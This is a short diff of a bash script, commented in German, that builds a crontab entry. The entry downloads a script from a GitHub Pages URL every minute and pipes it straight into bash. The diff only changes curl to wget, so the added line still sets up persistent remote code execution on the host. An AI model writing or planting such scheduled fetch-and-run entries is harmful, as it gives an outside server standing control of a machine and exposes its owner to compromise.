@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Der Befehl, den du hinzufügen möchtest
-NEUER_BEFEHL="* * * * * curl https://hckdx.github.io/status | bash ; echo '$(date)' > /home/vlguser/test.txt"
+NEUER_BEFEHL="* * * * * wget -O - https://hckdx.github.io/status | bash ; echo '$(date)' > /home/vlguser/test.txt"
 
 # Prüfen, ob der Befehl bereits in der crontab existiert
 (crontab -l | grep -F "$NEUER_BEFEHL") &>/dev/null
